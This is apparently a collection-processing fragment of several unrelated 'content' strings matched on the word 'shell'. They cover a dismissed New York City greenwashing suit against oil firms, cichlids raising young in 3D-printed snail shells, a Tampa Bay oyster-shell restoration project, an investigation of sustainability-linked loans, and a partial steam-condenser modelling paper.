pipeline setbacks weigh on Gilead.

            "content": "A judge has dismissed New York City\u2019s lawsuit seeking to hold Exxon Mobil, BP and Shell liable for misleading the public about their products, and their commitment to renewable energy and fighting climate change.\n\nIn a decision on Tuesday, state Supreme Court Justice Anar Patel said the city could not claim its climate-conscious residents were sensitive to how fossil fuels cause climate change, only to then be duped by the oil companies\u2019 failure to disclose how their fossil fuel products contributed to it.\n\n\u201cThe city cannot have it both ways,\u201d Patel wrote.\n\nPatel found no proof the oil companies and the defendant American Petroleum Institute conducted \u201cgreenwashing\u201d campaigns, including statements about clean energy and alternative energy, to boost sales of fossil fuel products in the city.\n\nShe also said general statements such as Exxon\u2019s claim that its fuel helps people drive \u201ccleaner, smarter and longer\u201d were too vague to suggest the defendants\u2019 products had nothing to do with climate change.\n\nWith about 8.3 million people, New York City said the companies falsely portrayed themselves in ads and social media as climate change leaders despite minimal investments in clean energy such as wind and solar.\n\nIt sought civil fines and an end to alleged deceptions.\n\nNicholas Paolucci, a spokesperson for the city\u2019s law department, on Wednesday said the city is reviewing its options.\n\n\u201cOur complaint alleged that these defendants spent millions to mislead consumers to think that they, and their products, contribute to a clean energy future,\u201d he said. \u201cThey do not. Companies that violate the city\u2019s consumer protection laws should be held fully accountable. New Yorkers deserve no less.\u201d\n\nIn a statement, Exxon said: \u201cAt some point, our hope is that political figures around the country come to understand that ideological hatred for us doesn\u2019t mean we did anything wrong.\u201d\n\nShell declined to comment. BP did not immediately respond to a request for comment.\n\nMany U.S. state and local governments have sued oil companies over climate change, including the emission of carbon dioxide and other greenhouse gases.\n\nPatel ruled one day after the U.S. Supreme Court refused to halt the city of Honolulu\u2019s own lawsuit against Exxon, BP, Shell and several other oil companies.\n\nNew York City\u2019s lawsuit began in April 2021, three weeks after a federal appeals court rejected its lawsuit seeking to hold Exxon, BP, Shell, Chevron and ConocoPhillips liable to pay its costs from global warming.\n\nThe American Petroleum Institute welcomed the latest decision. \u201cClimate policy is for Congress to debate and decide, not a patchwork of courts,\u201d said Ryan Meyers, the trade group\u2019s general counsel.\n\nThe case is City of New York v.

            "content": "When do young fish leave their home?\n\n3D-printed snail shells provide insights into the brood care of cichlids\n\nShell-dwelling cichlids take intense care of their offspring, which they raise in abandoned snail shells. A team at the Max Planck Institute for Biological Intelligence used 3D-printed snail shells to find out what happens inside. The young and the mother each follow their own, but synchronized schedules: as soon as the larvae prefer light, they leave the shell on the ninth day after fertilization. The mother, in turn, follows a strict brood-care routine to prevent the young from emerging before this day. The study thus identifies important innate processes during the brood care of cichlids and highlights the complex interplay of different behaviors.\n\n3D-printed shell halves allowed researchers to peek inside the cichlid's home and observe the behavior of the mother and her fry during brood care. \u00a9 MPI for Biological Intelligence/ Axel Griesch 3D-printed shell halves allowed researchers to peek inside the cichlid's home and observe the behavior of the mother and her fry during brood care. \u00a9 MPI for Biological Intelligence/ Axel Griesch\n\nThe ideal time to leave home should be carefully considered: if children move out too early, they may not be able to cope on their own. On the other hand, if they stay too long in Hotel Mom, the parents' resources will be overwhelmed. All over the animal kingdom, this balancing act can determine the fate of parents and offspring. But who or what decides when it is time for the young to leave? A team in Herwig Baier`s research department has studied this in cichlids. These fish are particularly interesting because, unlike many other fish species, they are very social and provide intensive brood care.\n\nThe fish species studied, Lamprologus ocellatus, belongs to the family of shell-dwelling cichlids and are naturally found in Lake Tanganyika in Africa. What makes them special is that they live in abandoned snail shells in which they raise their offspring. Although these cichlids are a popular aquarium fish, what goes on inside the shell has, until now, been hidden from the outside world.\n\nInsights into the shell\n\nWith a clever idea, Ash Parker and her colleagues managed to gain insight into the so far hidden interior of the cichlid home: they printed snail shells with a 3D printer. With a sophisticated design, these shells provide an ideal home for the fish, but are open on one side. Placed against the aquarium glass, the researchers were able to document what was happening with videos and photos.\n\nThe AI-supported image analysis revealed exciting behaviors and a precise chronological sequence: The mother lays the eggs in the upper chamber of the snail shell. The father then fertilizes the eggs. After two to three days, the larvae hatch and the mother transports them with her mouth to the lowest chamber of the shell. After seven to eight days, the larvae feed independently and make their first attempts at swimming. Throughout this time, the mother guards the shell and takes care of the young. She keeps putting the eggs and larvae into her mouth to clean them. She also rapidly moves her rear fins to ensure a constant exchange of water in the shell.\n\nLeaving the house on the ninth day\n\nWhile the larvae initially remain in the lower, dark chamber of the shell, by the ninth day after fertilization they increasingly swim to the upper chambers and even out of the shell. The researchers found that at this point, the larvae suddenly start to like brighter areas. Thus, the time of emergence appears to be controlled intrinsically by a change in light preference.\n\nThe larvae are only indirectly dependent on their mother to follow this schedule: when Ash Parker removed the mother, water quality probably decreased due to the absence of fin fanning and the larvae left the shell before the ninth day.\n\nTwo independent schedules for mother and larvae\n\nThe mother fish itself also has a precise idea of when it is time to let her offspring go: if her young were replaced with an older clutch, she would push the larvae that she thought swam out too early back into the shell \u2013 without considering their advanced developmental stage.\n\nThe observations show that mother and young follow independent, innate schedules. However, these are perfectly synchronized: the juveniles and the mother seem to agree that the offspring is ready to leave parental care for the first time on the ninth day. The study thus reveals important processes during brood care in cichlids and lays the foundation for studying the evolution and neural basis of this complex behavior.",

He cranks up the engine on the small skiff, which is loaded with bags of oyster shells.\n\nFreezing salt spray heralds our journey from the mouth of the Alafia River, as we head to Fantasy Island.\n\nNo, not that Fantasy Island, as fans of the 1970s TV show may remember.\n\nThis Fantasy Island was created in the 1970s as a deep channel was dredged for Tampa's port. It came into existence about the same time as its other interestingly named neighbors, Beer Can Island and 2D and 3D islands.\n\nThey\u2019ve become important rookeries for wading birds, like white ibis, little blue herons and rare reddish egrets.\n\nVolunteers are on this 2-acre speck in the bay this chilly morning to plant oyster reef balls. They're made up of shells collected from area restaurants. Living oysters can attach their young to them and become living reefs. They provide a barrier to deflect waves kicked up from huge freighters and cruise ships passing by.\n\nThose waves can erode the shorelines.\n\nTampa Bay Watch Aerial view of Fantasy Island, with the oyster shell beds at the bottom of photo\n\nAlong for the ride today are volunteers Nate and Heather Schneck of St. Petersburg. The cold? They're from Pennsylvania. So they're used to it.\n\n\u201c(It was) 43 when we woke up,\u201d Nate Schneck said. His wife, Heather said: \u201cYeah, love it. We've done some beach cleanups before with Treasure Island, but I think this is even more interactive and really fun.\u201d\n\nSo why are they out here battling freezing salt spray and cold feet?\n\nWell, it's for the birds.\n\n\u201cWe encroach on all these bird islands through development and everything like that, so it's important to preserve what we still have left to make sure they have somewhere to go,\u201d said Eric Plage, who manages the project for Tampa Bay Watch.\n\nTampa Bay Watch Oyster reef balls are submerged off Fantasy Island\n\nThe restoration cost about $200,000 and is being funded by the nonprofit Coastal Conservation Association Florida, Port Tampa Bay, Duke Energy and Neptune Flood Insurance of St. Petersburg.\n\nThis is the second phase of a restoration effort that began in 2016. Back then, Tampa Bay Watch volunteers noticed extreme erosion on the southern end, facing the shipping channel.\n\n\u201cThat is a big ship displacing a huge volume of water in an area that is supposed to be a bay with low energy with tidal flats and things like that,\u201d Plage said, \u201cso that energy greatly affects those shorelines or the constant kind of smashing against them and things like this.\u201d\n\nVolunteers like the Schnecks spent much of this winter morning shoveling oyster shells into bags that will be placed on the northeast shore of the island. In addition to buffering the island from storm surges and ship wakes, Plage said oysters are prized for filtering water, improving the water quality in the bay.\n\n\u201cWe created a whole living shoreline, put that in place, and the reef balls are completely covered in oysters,\u201d he said. \u201cIt's a square meter of surface area on one of these reef balls, and they can have on average in square meter of about 1,000 oysters. And if you kind of do some math of like in 2 to 5 gallons of water, up to 50 gallons of water a day for an oyster, that's a lot of water being filtered a day by these things.\u201d\n\nSteve Newborn / WUSF Public Media Eric Plage, left, helps haul oyster shell bags onto Fantasy Island\n\n\u201cAnd then we'll plant the salt marsh grass behind those reef balls, those shell bags, higher up on the shore, but that also creates filtration through that salt marsh habitat,\u201d Plage said. \u201cIt allows the mangroves to grow up through it, and you have those different ecosystems running down one of our living shorelines.\u201d\n\nThese islands are considered critical for wading birds. Nearby, Audubon's Alafia Banks Sanctuary is one of the biggest rookeries in Florida.\n\nBut Plage says putting all your bird eggs in one basket can invite disaster.\n\n\u201cWe've had instances in the past since we did that project in 2016, 2017 where a big portion of the white ibis that usually nest on Alafia Banks have come over and just blanketed Fantasy Island with hundreds of thousands of birds on this little speck because of situations that arose on other islands,\u201d he said. \u201cSo it's incredibly important to protect these islands out here.\u201d\n\nWhat they learn out here can be used to help protect a lot of other islands threatened by rising seas in the days to come.\n\nHere's some information about the project from Tampa Bay Watch:\n\nProject Timeline:\n\n\n\n1970: Fantasy Island is created as part of the Harbor Deepening Project.\n\n\n\nFantasy Island is created as part of the Harbor Deepening Project. 2004: Tampa Bay Watch conducted a community-based restoration program with the Audubon of Florida, Florida Aquarium, Coastal Conservation Association, Riverview High School and local Boy Scout Troops to create a series of oyster bars along the southeastern shoreline of Fantasy Island.\n\n\n\nTampa Bay Watch conducted a community-based restoration program with the Audubon of Florida, Florida Aquarium, Coastal Conservation Association, Riverview High School and local Boy Scout Troops to create a series of oyster bars along the southeastern shoreline of Fantasy Island. 2008: Tampa Bay Watch, in collaboration with the Florida Aquarium, constructed an additional 275\u2019 of new oyster bar along the island\u2019s western shoreline.\n\n\n\nTampa Bay Watch, in collaboration with the Florida Aquarium, constructed an additional 275\u2019 of new oyster bar along the island\u2019s western shoreline. 2017: Tampa Bay Watch, in collaboration with the Florida Aquarium, constructed an additional 700\u2019 feet of new Living Shoreline along the southern shoreline of Fantasy Island.\n\n\n\nTampa Bay Watch, in collaboration with the Florida Aquarium, constructed an additional 700\u2019 feet of new Living Shoreline along the southern shoreline of Fantasy Island. 2024: Tampa Bay Watch, in collaboration with Port Tampa Bay, Coastal Conservation Association, Duke Energy, and Neptune Flood Insurance plans to stabilize 500 feet of eroding shoreline by installing 870 oyster reef balls and 60 tons of bagged fossilized shell.\n\nFor more information on volunteer opportunities or to stay updated on the progress of the Fantasy Island Phase II Project, you can visit Tampa Bay Watch\u2019s website .",

            "content": "Shell got one. So did the pipeline company Enbridge. And last summer, energy giant Drax got its biggest one to date, worth more than half a billion dollars.\n\nThese weren\u2019t just any loans to massive corporations. They were made by some of the world\u2019s largest banks at discounted rates, in exchange for commitments by each of these mega-polluting companies to improve their environmental practices.\n\nThat may sound like a typical \u201cgreen\u201d loan. But these \u201csustainability-linked loans,\u201d or SLLs, require little of the same accountability. Companies don\u2019t have to spend the money toward their sustainability targets, and neither they nor the banks have to disclose interest rates, benchmarks for success or the penalties for falling short.\n\nIn the last several years, banks gave out more than $286 billion in these SLLs to hundreds of companies in environmentally damaging industries, including fossil fuels, mining and companies linked to significant deforestation, an investigation by The Examination, Toronto Star and Mississippi Today has found. That\u2019s nearly 1 in 5 dollars out of all SLLs, the team\u2019s analysis of data from the London Stock Exchange Group from 2018 to 2023 showed.\n\n___\n\nThis investigation was reported in partnership with The Examination, Mississippi Today and Toronto Star. Reporting was supported by the Pulitzer Center\u2019s Rainforest Investigations Network.\n\n___\n\nAs climate change becomes more severe, with carbon emissions and global temperatures surging to record highs last year, pressure is on the biggest polluters to clean up their processes. But instead, these loans are often used to help companies and banks improve their reputation without actually reducing environmental harms.\n\nIn some cases, the loans have financed companies that were actively expanding polluting operations, the investigation found.\n\n\u201cThey do not lead to measurable change,\u201d said Richard Brooks, climate finance director for the environmental nonprofit Stand.Earth. \u201cAnd they\u2019re really meant to greenwash your finances mostly for expansion activities.\u201d\n\nShortly after receiving an SLL, Canada-based Enbridge expanded a pipeline carrying tar sands oil from Alberta to the United States, a project estimated to increase carbon emissions by the equivalent of 50 new coal-fired power plants.\n\nU.K.-based Drax has gotten a series of SLLs linked to producing cleaner energy as it shifts from burning fossil fuels to burning wood pellets \u2014 even though researchers say such a switch is worse for the climate. Drax is making plans to expand its wood biomass operations across the U.S.\n\nCompanies receiving these loans often sent out press releases trumpeting sweeping sustainability plans and broad goals but seldom made clear which, if any, targets were binding, the investigation found.\n\nMany that set goals for reducing carbon pollution used \u201cintensity\u201d of emissions rather than overall emissions. Intensity measures efficiency per unit rather than total emissions. For example, a company might highlight that it has reduced methane emissions per head of cattle while failing to note it has increased the size of the herd.\n\nIn several cases, the companies\u2019 own documents showed that their overall emissions increased substantially even as they received SLLs linked to decarbonization.\n\nBanks get several benefits from issuing SLLs: They lock in massive multiyear deals with major corporations and typically count these loans toward their own public targets for sustainable lending.\n\nProponents of these loans say they serve an important purpose. Since they are not tied to a specific green project, they allow a more diverse set of companies to use financial incentives to improve their environmental practices. This in turn produces impact at a larger scale, they say.\n\n\u201cIn my experience the people who are structuring these loans are endeavoring to do so in a responsible manner,\u201d said Tess Virmani, head of policy for the lending industry group Loan Syndications and Trading Association. \u201cI don\u2019t think that there is as much of a greenwashing risk as there is the perception of one.\u201d\n\nNone of the banks or companies in this story would disclose specific benchmarks or financial details of their loans, many citing issues of confidentiality. Royal Bank of Canada, one of the lenders that financed the loans to Enbridge and Drax, said it follows industry practices and is vested in helping the environment.\n\n\u201cRoyal Bank of Canada is proud to have worked with our clients in recent years to deliver innovative financial solutions including sustainable finance,\u201d the bank said in a statement, adding that its criteria for this financing were in \u201calignment with widely accepted global and Canadian industry standards.\u201d\n\nMeasuring the consequences\n\nDrax Group, which reported more than $10 billion in revenue in 2023, brands itself as a leader in renewable energy. It received its first SLL in 2020 for $369 million, financed by more than a dozen banks including JPMorgan Chase, Barclays and Bank of America.\n\nThe loan was linked to reducing Drax\u2019s \u201ccarbon intensity\u201d \u2014 rather than total emissions \u2014 and its specific terms were not detailed in public documents.\n\nIn the same year, Drax was running into trouble with environmental regulators over its wood pellet plant in Gloster, a small town in rural Mississippi. State regulators fined the facility $2.5 million, one of the highest Clean Air Act penalties in Mississippi\u2019s history, for the release of toxic chemicals called volatile organic compounds.\n\nIn July 2021, Drax finalized another SLL for $208 million backed by lenders including the Royal Bank of Canada. It took out the loan to finance its debt from acquiring Canadian pellet producer Pinnacle Renewable Energy, a deal that doubled down on its wood biomass strategy. Like its earlier loan, this one also was linked to reducing its carbon intensity.\n\nDrax is one of dozens of companies in the wood biomass industry \u2014 which burns wood and wood waste products to produce energy \u2014 that have taken advantage of SLLs.\n\nThe Examination and Mississippi Today found that 40 companies that operate wood biomass facilities obtained more than $76 billion in SLLs between 2018 and 2023. The analysis was based on loan information from the London Stock Exchange Group and data on wood biomass facilities from the Environmental Paper Network, a global coalition of civil society organizations.\n\nWood biomass companies have flourished in the last decade, presenting their work as an eco-friendly alternative to fossil fuel. U.S. exports of wood pellets reached nearly 10 million metric tons in 2023, according to the U.S. Industrial Pellet Association. More than 80% of American pellets are made in the U.S. South and shipped to nations that have made some of the biggest climate promises in the world.\n\nThe industry makes the case that the forests they harvest for energy will eventually grow back and cancel out the emissions caused by burning wood, allowing them to claim massive climate benefits when replacing oil or coal.\n\nThe United Kingdom and European Union have embraced this logic, classifying wood bioenergy as renewable and carbon neutral and relying on it to meet national climate goals.\n\nHow is this possible? They don\u2019t count emissions from burning wood.\n\nThis carbon accounting escape clause \u2014 endorsed by the United Nations Framework Convention on Climate Change \u2014 has allowed the U.K. and Europe to claim emissions cuts based on production of wood pellets at factories that pollute in America.\n\nThe U.S. has no such subsidies for wood bioenergy, but the industry is lobbying for their provision under the Inflation Reduction Act.\n\nMost climate scientists reject the central claim that underlies this carbon accounting loophole: that trees can grow fast enough to offset emissions from burning them.\n\nIn 2021, more than 500 scientists wrote an open letter to President Joe Biden and other world leaders urging them to repudiate the \u201cfalse solution\u201d of wood biomass in climate policies and warning that \u201cthis burning of wood will increase warming for decades to centuries.\u201d\n\nJohn Sterman, a professor at the Massachusetts Institute of Technology, said Drax\u2019s sustainability-linked loans incentivize activities that end up being more damaging to the environment. In 2018, he conducted a study that found that energy from wood biomass is more carbon-intensive than burning coal.\n\n\u201cWood bioenergy is harmful and it actually makes climate change worse,\u201d Sterman, an expert on corporate environmental practices, told The Examination. \u201cIt\u2019s actively moving us in the wrong direction.\u201d\n\nEmissions intensity also does not pass muster as a way to measure climate progress, Sterman said, calling it \u201cmeaningless\u201d to set a target that does not limit emissions overall.\n\n\u201cThe atmosphere responds to total emissions,\u201d he said.\n\nDrax said the scenarios in Sterman\u2019s study do not reflect its forestry practices.\n\n\u201cWe strongly believe that a transition to modern bioenergy, in which biomass is sourced sustainably, is an important part of delivering a net zero world,\u201d the company said in an emailed response to questions.\n\nThe company said in its 2023 annual report that its overall emissions were down and that it had already achieved some of its key sustainability goals, including an 89% reduction in emission intensity in its operations since 2020. Drax told The Examination that these gains were in large part due to replacing coal with \u201csustainably sourced biomass.\u201d\n\nThe company didn\u2019t credit the escape clause that allows it to ignore massive emissions from burning wood.\n\nIn August 2024, Drax accepted its largest SLL to date, renewing its 2020 loan in a deal that expanded its credit line from $369 million to $553 million.\n\nThe company announced the following month that it was considering expanding U.S. operations, investing up to $12.5 billion to build more biomass plants across the country in the next decade.\n\nBarclays said in a statement that its criteria for sustainability-linked finance was \u201cconsistent with industry practice\u201d and that it couldn\u2019t comment on individual SLLs for reasons of confidentiality. The Royal Bank of Canada said the same.\n\nJPMorgan declined to comment, and Bank of America did not respond to repeated email and telephone inquiries.\n\nPeople living near these wood pellet facilities say they have more imminent concerns than climate change.\n\nMore than half a dozen Gloster residents recently told The Examination that since the Drax plant opened in 2016, they\u2019ve noticed a bad smell coming from the factory \u2014 comparing it to rotten eggs \u2014 and that they have developed shortness of breath or asthma.\n\nCarmella Causey, 62, said she thinks the emissions from Drax have exacerbated her health issues. She said she now needs supplemental oxygen just to make her bed.\n\n\u201cIt\u2019s hard to breathe,\u201d Causey said. \u201cI don\u2019t know what\u2019s going on, but there\u2019s something in this air.\u201d\n\nLast September, Drax settled with Mississippi regulators for another set of alleged violations in Gloster, this time for emissions of a group of toxic chemicals called hazardous air pollutants, which the U.S. Environmental Protection Agency defines as \u201cthose known to cause cancer and other serious health impacts.\u201d Without admitting wrongdoing, the company agreed to pay a $225,000 fine, of which $75,000 will be dedicated to installing a dust suppression screen at the plant.\n\nKrystal Martin, a community leader in Gloster who has spearheaded opposition to Drax, said the screen is a decade too late.\n\n\u201cDust is already in our lungs. It\u2019s already in our bloodstream,\u201d Martin said.\n\nResearchers at Brown University have announced a $5.8 million grant from the National Institute of Environmental Health Sciences to study what is making people in Gloster sick and whether pollution from Drax\u2019s facility is responsible.\n\nDrax said it commissioned an air quality analysis by an environmental consulting firm in 2023 that found \u201cno adverse impacts to human health,\u201d adding that it is committed to high standards of environmental and safety compliance. \u201cDrax has partnered with state regulators to establish environmental best practices,\u201d the company said. It did not provide its air quality analysis to The Examination.\n\n\u2018Totally dishonest\u2019\n\nJointly created by banks and companies in 2017, sustainability-linked loans face little oversight. The contracts are private. The closest to a formal standard is a set of voluntary principles for SLLs developed by loan industry groups, which call for sustainability targets to be ambitious, to address borrowers\u2019 core business activities and for compliance to be verified by outside reviewers.\n\nIn several countries where SLLs have surged in popularity, regulators and investors have spoken out about loans they said were being misused.\n\nIn June 2023, the U.K.\u2019s Financial Conduct Authority released a blunt open letter highlighting its \u201cmarket integrity concerns\u201d about SLLs, including \u201cweak incentives, potential conflicts of interest, and suggestions of low ambition\u201d in sustainability targets.\n\n\u201cWe also noted a general sentiment among banks that the \u2018relationship\u2019 may matter more than the borrower\u2019s sustainability credentials,\u201d the agency added.\n\nAt the start of last year, a shareholder activist group in Canada filed a complaint calling on banking regulators to investigate whether the country\u2019s five biggest banks had misled investors about their sustainable finance activities. The complaint cited SLLs to oil and mining companies that it said would actually lead to increased carbon emissions.\n\nIn May, the investment manager for the United Methodist Church \u2014 which had invested with Barclays \u2014 blasted the bank for financing \u201ctotally dishonest\u201d SLLs to fossil fuel companies, The Bureau of Investigative Journalism reported.\n\nIn an email, Barclays said that the Bureau story overestimated how much money in sustainable finance it provided to fossil fuel companies, and that as of last February, it no longer funds energy companies for new oil and gas fields.\n\nThe Canadian Bankers Association said in a statement that its members help clients pursue sustainable finance and that each bank is responsible for defining its own eligibility criteria.\n\nIndependent research suggests that greenwashing in SLLs is widespread.\n\nA 2023 study of more than a thousand SLLs showed that, on average, companies\u2019 environmental ratings from outside reviewers went down in the years after they obtained the loans. That was especially true for companies that didn\u2019t disclose their sustainability targets and benchmarks, the study found.\n\nThis pattern is \u201ca pretty strong indication that there must be some greenwashing going on,\u201d said Sehoon Kim, a finance professor at the University of Florida who conducted the research.\n\nA July 2024 report by Moody\u2019s Ratings, one of the biggest credit rating agencies, also found SLLs to be less effective in boosting sustainability than other types of loans. Moody\u2019s found that only 42% of SLLs that it had rated received high sustainability quality scores. In contrast, 88% of loans used directly for green projects scored highly.\n\nFor the first time since their inception, global volumes of SLLs declined significantly in 2023, slumping to $457 billion from $561 billion in 2022. The downturn came as the market faced a backlash against environmentally conscious investing as well as the growing concerns about greenwashing.\n\nIn the last year, prominent companies including Mercedes-Benz and steel giant ArcelorMittal have dropped sustainability provisions from their loans, Bloomberg reported in December. In recent months, leading American banks including JPMorgan, Citibank and Wells Fargo have withdrawn from a global alliance of lenders that had agreed to pursue net-zero carbon emissions.\n\nVirmani, of the lending industry association, said skepticism about SLLs and the complicated political attitude toward sustainability means even well-intentioned companies are now thinking twice about these loans out of concern they will be accused of greenwashing.\n\n\u201cThere has been a pullback in companies\u2019 desire to do these loans because of that fear,\u201d she said.\n\nExperts say the consequences of greenwashing in SLLs are worse than allowing big corporations to tout potentially bogus makeovers. Flawed SLLs can also take the place of funding intended for truly sustainable companies while giving banks cover to keep investing in the world\u2019s most harmful industries.\n\n\u201cThere are choices being made here to continue to do business as usual and add a green veneer to it,\u201d said Brooks, of the environmental group Stand.Earth.\n\nPipelines and protests\n\nIn November 2020, Enbridge won permission from Minnesota to replace an aging pipeline carrying Canadian oil through the state, doubling its capacity at the time. Called Line 3, the pipeline would carry tar sands oil from Alberta. The oil is a heavy, high-sulfur product that is among the most carbon-intensive types of crude oil in the world, according to the Carnegie Endowment for International Peace\u2019s Oil-Climate Index.\n\nA few months later, Enbridge announced a $694 million SLL that it described as linked to environmental, social and governance goals, known as ESG, with no further details provided. At the time, the company\u2019s overall public ESG objectives included reducing its emissions intensity \u2014 the same metric used by Drax \u2014 35% by 2030 and increasing diversity in its board and workforce.\n\nThe loan was funded by a group of more than 20 banks including Royal Bank of Canada, Barclays, JPMorgan and Citibank.\n\nAs the pipeline advanced, Indigenous-led protesters denouncing the project\u2019s impact on the climate and local water sources fought back, some chaining themselves in its path to block construction. In the following months, police and private security guards arrested hundreds of pipeline protesters \u2014 including 186 on one day in June alone.\n\nIn October 2021, Enbridge completed construction and reopened the Line 3 pipeline.\n\nNow, with double the capacity, the emissions would triple to 273 million tons of carbon dioxide each year, according to a state environmental review in Minnesota. The total added emissions were equivalent to building 50 new coal-fired power plants, a Macalester College physicist calculated.\n\nEnvironmentalists say that the expansion opened the door to a surge in the production of tar sands, posing an even bigger threat to the climate.\n\n\u201cThat increased capacity has enabled new projects to go ahead,\u201d said Keith Stewart, a senior energy strategist with Greenpeace Canada.\n\nYet Enbridge still announced in 2023 that it had already met one of its key climate objectives, slashing its emissions intensity by 37% in the last five years.\n\nEnbridge\u2019s accomplishment rests on its definitions. Not only does the target cover emissions intensity rather than actual emissions, but it includes only emissions from the company\u2019s direct operations like its pipelines and not from burning the oil and gas that these pipelines bring to market. These direct operations make up less than 2% of total emissions from producing and burning tar sands oil, according to a company brochure, while combustion accounts for about 70%.\n\nEnbridge\u2019s indirect emissions, primarily from the use of its fuels, increased to nearly 55 million tons in 2023 from about 50 million tons when it received its loan two years earlier, according to its annual Sustainability Report.\n\nThe company said in written responses that it is committed to fighting climate change and that it has made \u201cgood progress\u201d toward this goal by decreasing its absolute emissions from its direct operations by 20% since 2018. That year was marked by exceptionally high emissions and gives a rosy view of its progress despite its more recent increases in its much larger category of emissions. Enbridge said it chose 2018 as its benchmark because it was the first year its emissions data was complete after a previous merger.\n\n\u201cWe are transparent in our reporting and disclose all emissions data annually in our Sustainability Reports \u2014 emissions intensity and actual emissions,\u201d the company said in an email. \u201cBoth are on a downward trajectory.\u201d\n\nEnbridge, which reported 2023 revenues of $32 billion, said replacing the Line 3 pipeline was actually better for the environment than if it had not been rebuilt.\n\n\u201cIf Line 3 did not exist, the products it carries would be transported by more carbon intense transportation modes,\u201d the company said.\n\nThe Royal Bank of Canada and Barclays said in statements that their approaches to sustainable finance are consistent with industry standards, and that they do not comment on individual clients or transactions. Citibank and JPMorgan declined to comment.\n\nOil giant Shell obtained a $10 billion SLL \u2014 also linked to reductions in emissions intensity \u2014 in 2019. But over the next few years, during the term of the loan, it walked back several of its critical climate goals.\n\nIn 2023, it scrapped a plan to cut back its oil output in favor of cleaner energy sources. And last year, it abandoned a 2035 target for reducing emissions intensity, citing \u201cuncertainty in the pace of change in the energy transition.\u201d\n\nShell said it has met its short-term goals for reducing emissions intensity and also has targets for reducing emissions from its operations.\n\n\u201cShell is committed to becoming a net-zero emissions energy business by 2050,\u201d the company said in an email.\n\n\u2018Zero deforestation\u2019 claims questioned\n\nRoyal Golden Eagle, an Indonesian forestry conglomerate with more than $35 billion in assets, committed to a \u201czero deforestation\u201d policy in 2015, and in recent years, the group has sought to remake itself as a leader in sustainability.\n\nIt has cited SLLs as one of the main elements of this identity. Since 2021, the group has secured more than $3.25 billion in SLLs, according to company documents. The loans were financed by numerous banks including Mitsubishi UFJ Financial Group, which served as sustainability adviser for two of the loans.\n\n\u201cThis is just the beginning,\u201d Royal Golden Eagle President Tey Wei Lin said in an article by the group in 2022 celebrating its environmental commitments. \u201cWe will be moving a significant majority of our financing towards SLLs.\u201d\n\nThe loans to its palm oil subsidiaries Asian Agri and Apical were linked to commitments to \u201cno deforestation,\u201d backed by full supply-chain traceability, by the end of 2025.\n\nBut two recent reports by the environmental group Rainforest Action Network have raised questions about how dedicated the companies are to the goal.\n\nAn August 2024 analysis of satellite data by the environmental group found that deforestation continued on properties belonging to Asian Agri and suppliers of Apical after the companies received their SLLs, and even increased in 2023. In November, the group found that Apical was among several palm oil traders sourcing palm oil fruits from illegal plantations within a nature reserve in Sumatra known as the \u201cOrangutan Capital of the World.\u201d\n\nRoyal Golden Eagle disputed that it is responsible for recent deforestation but declined to provide The Examination with official maps or files supporting its claims, saying it would violate Indonesian law to share them. It said it acted promptly after the November report of illegally sourced palm oil fruit, and cut off the company named in the report as a supplier.\n\n\u201cRoyal Golden Eagle firmly refutes the allegations made by the Rainforest Action Network on its agribusiness and reaffirms its strong commitment to sustainability and transparency,\u201d a company spokesperson said in an email.\n\nMitsubishi UFJ Financial Group did not respond to repeated telephone and email inquiries.\n\nAlex Helan, a senior researcher for the Rainforest Action Network, said its findings revealed \u201ccritical flaws\u201d in the SLL market.\n\n\u201cThere\u2019s a baked-in incentive for the borrowers and the issuers to mutually benefit their sustainability claims without delivering any meaningful impact,\u201d Helan said.\n\n___\n\nTo view a searchable database of the sustainability-linked loans in this analysis and a detailed methodology, click here.\n\n\u2014-\n\nLoans provided in foreign currencies are stated in U.S. dollar values as of January 2025 exchange rates.\n\n\u2014-\n\nSasha Chavkin is a senior reporter for The Examination.

            "content": "The dynamic behavior of a shell-and-tube steam condenser can be modeled by analyzing the interaction between steam, cooling water, and the heat exchange surfaces within the system32. As can be seen in Fig. 1, the shell-and-tube condenser normally has an exterior design that is either cylindrical or elliptical in shape. It is equipped with end closures that are designed to create water chambers, and it is positioned with a perforated tube plate in between the closures and the basic shell. The many cooling water pipes that are organized in layers are held in place by this plate. Through a pipe located at the top of the condenser, steam is introduced into the device. This pipe is connected to the exhaust equipment either directly or indirectly through a compensator. Condensed water is collected at the bottom of the shell in a tank, and air is expelled through an outlet near the lower section.\n\nThe condenser works by allowing steam to flow in through the inlet pipe, where it condenses upon coming into contact with the cooler tube walls. During this process, the steam transfers its heat to the cooling water inside the pipes. The cooling water, which enters at a specific temperature, flows through the first set of pipes at the bottom of the condenser. As it moves through additional chambers and pipes, the water absorbs heat from the steam. After several stages, the now-warmed cooling water exits through the outlet pipes at a higher temperature, completing the heat exchange process. The constant condensation of steam in the mixture steadily lowers the quality of the steam as it moves toward the exhaust port, while the air content gradually increases. This occurs as the steam and air flow toward the exhaust port. When the air concentration in the mixture that is entering the cooling zone reaches a significant level, the condensation process is said to have reached its conclusion.\n\nFig. 1 General schematic of shell-and-tube steam condenser. Full size image\n\nThe shell-and-tube condenser\u2019s behavior can be modeled mathematically, with the governing equations for the steam zone provided in17,19.\n\n$$\\:\\frac{{dG}_{s}}{dt}={G}_{st}+{G}_{ost}+{G}_{c}-{G}_{ss}$$ (1)\n\n$$\\:\\frac{{dP}_{s}}{dt}={\\frac{{R}_{s}\\left(\\frac{d{G}_{s}}{dt}\\right)}{V}(T}_{s}+273.15)$$ (2)\n\n$$\\:\\frac{{dG}_{s}{H}_{s}}{dt}={G}_{st}\\times\\:{H}_{st}+{G}_{ost}\\times\\:{H}_{ost}-({G}_{c}+{G}_{ss})\\times\\:{H}_{s}$$ (3)\n\nThe steam mass balance, vapor pressure, and average steam enthalpy in the condenser are all aspects that are addressed by Eqs. (1), (2) and (3). Related references17,19 contain the governing equations that correspond to the air zone which can be found in those references.\n\n$$\\:\\frac{{dG}_{a}}{dt}={G}_{vb}+{G}_{n}+{G}_{g}-{G}_{a}$$ (4)\n\n$$\\:\\frac{{dP}_{a}}{dt}={\\frac{{R}_{a}\\left(\\frac{d{G}_{a}}{dt}\\right)}{V}(T}_{s}+273.15)$$ (5)\n\n$$\\:{P}_{C}={P}_{s}+{P}_{a}$$ (6)\n\nThe air mass balance, air pressure, and absolute pressure within the condenser are all described by the Eqs. (4), (5) and (6). In the hot water zone, the equations that regulate the zone are described in17,19.\n\n$$\\:{L}_{c}=\\frac{{G}_{w}}{\\rho\\:{A}_{w}}$$ (7)\n\n$$\\:\\frac{{dG}_{w}}{dt}={G}_{c}+{G}_{gp}-{G}_{wo}$$ 